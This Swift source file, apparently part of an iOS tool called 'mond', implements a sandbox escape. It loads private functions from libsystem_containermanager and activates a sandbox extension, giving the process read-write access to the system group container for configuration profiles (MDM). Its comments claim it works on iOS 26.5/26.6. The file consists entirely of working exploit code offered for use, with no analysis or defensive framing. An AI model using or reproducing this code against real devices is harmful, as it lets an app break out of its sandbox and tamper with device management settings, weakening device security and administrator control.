//
//  mdm.swift
//  mond
//
//  MDM sandbox escape using container_object_sandbox_extension_activate
//  (same approach as cmg.swift, adapted for configurationprofiles systemgroup)
//  Works on iOS 26.5/26.6 where bad_query returns -4 for configurationprofiles.
//

import Foundation
import XPC

private typealias mdm_create_fn      = @convention(c) () -> UnsafeMutableRawPointer?
private typealias mdm_activate_fn    = @convention(c) (UnsafeMutableRawPointer?, Bool) -> Bool
private typealias mdm_free_fn        = @convention(c) (UnsafeMutableRawPointer?) -> Void
private typealias mdm_set_ui64_fn    = @convention(c) (UnsafeMutableRawPointer?, UInt64) -> Void
private typealias mdm_set_bool_fn    = @convention(c) (UnsafeMutableRawPointer?, Bool) -> Void
private typealias mdm_set_obj_fn     = @convention(c) (UnsafeMutableRawPointer?, (any OS_xpc_object)?) -> Void
private typealias mdm_get_res_fn     = @convention(c) (UnsafeMutableRawPointer?) -> UnsafeMutableRawPointer?
private typealias mdm_get_path_fn    = @convention(c) (UnsafeMutableRawPointer?) -> UnsafePointer<CChar>?

private func mdm_load_sym<T>(_ handle: UnsafeMutableRawPointer, _ name: String, as: T.Type) -> T? {
    guard let sym = dlsym(handle, name) else {
        print("(mdm_sbx) missing symbol: \(name)")
        return nil
    }
    return unsafeBitCast(sym, to: T.self)
}

/// Grant read-write sandbox access to the configurationprofiles directory.
/// Returns the activated base path (e.g. /private/var/containers/Shared/SystemGroup/…/Library/Caches)
/// or nil on failure.
func grant_mdm_access() -> String? {
    guard let lib = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW) else {
        print("(mdm_sbx) dlopen failed")
        return nil
    }
    defer { dlclose(lib) }

    guard
        let create   = mdm_load_sym(lib, "container_query_create",                      as: mdm_create_fn.self),
        let activate = mdm_load_sym(lib, "container_object_sandbox_extension_activate",  as: mdm_activate_fn.self),
        let free     = mdm_load_sym(lib, "container_query_free",                         as: mdm_free_fn.self),
        let set_cls  = mdm_load_sym(lib, "container_query_set_class",                    as: mdm_set_ui64_fn.self),
        let set_tran = mdm_load_sym(lib, "container_query_set_transient",                as: mdm_set_bool_fn.self),
        let set_gids = mdm_load_sym(lib, "container_query_set_group_identifiers",        as: mdm_set_obj_fn.self),
        let set_plat = mdm_load_sym(lib, "container_query_operation_set_platform",       as: mdm_set_ui64_fn.self),
        let set_flag = mdm_load_sym(lib, "container_query_operation_set_flags",          as: mdm_set_ui64_fn.self),
        let get_res  = mdm_load_sym(lib, "container_query_get_single_result",            as: mdm_get_res_fn.self),
        let get_path = mdm_load_sym(lib, "container_object_get_path",                   as: mdm_get_path_fn.self)
    else {
        return nil
    }

    guard let q = create() else {
        print("(mdm_sbx) container_query_create returned nil")
        return nil
    }

    // Class 13 = SystemGroup
    set_cls(q, 13)
    set_tran(q, false)

    let arr = xpc_array_create(nil, 0)
    xpc_array_set_string(arr, XPC_ARRAY_APPEND, "systemgroup.com.apple.configurationprofiles")
    set_gids(q, arr)

    set_plat(q, 2)
    // Same flags as cmg: bit 32 | bit 39
    set_flag(q, (1 << 32) | (1 << 39))

    guard let res = get_res(q) else {
        free(q)
        print("(mdm_sbx) container_query_get_single_result returned nil")
        return nil
    }

    guard activate(res, true) else {
        free(q)
        print("(mdm_sbx) container_object_sandbox_extension_activate returned false")
        return nil
    }

    guard let c_path = get_path(res) else {
        free(q)
        print("(mdm_sbx) container_object_get_path returned nil")
        return nil
    }

    let basePath = String(cString: c_path)
    free(q)
    print("(mdm_sbx) activated sandbox extension for configurationprofiles, base path: \(basePath)")
    return basePath
}
